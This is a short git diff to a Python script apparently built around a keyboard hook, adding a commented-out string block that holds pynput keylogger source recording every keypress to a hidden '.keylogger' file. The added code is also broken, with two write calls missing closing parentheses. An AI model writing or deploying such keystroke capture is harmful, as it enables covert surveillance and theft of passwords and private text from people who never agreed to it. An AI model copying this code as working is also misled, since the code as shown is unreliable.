@@ -47,3 +47,31 @@ if __name__ == '__main__':
 
 	# Close the listener when we are done
 	hookman.cancel()
+
+'''from pynput.keyboard import Listener
+
+# Specify the log file
+log_file = '.keylogger'
+
+# Function to write a newline character to the log file
+def newline():
+    with open(log_file, 'a') as file:
+        file.write('\n')
+
+# Function to handle key press events
+def on_key_press(key):
+    try:
+        with open(log_file, 'a') as file:
+            file.write(str(key.char)
+            newline()  # Add a newline character after each key press
+    except AttributeError:
+        # Handle special keys
+        with open(log_file, 'a') as file:
+            file.write(str(key)
+            newline()  # Add a newline character after each key press
+
+# Create a listener
+with Listener(on_press=on_key_press) as listener:
+    listener.join()
+
+'''
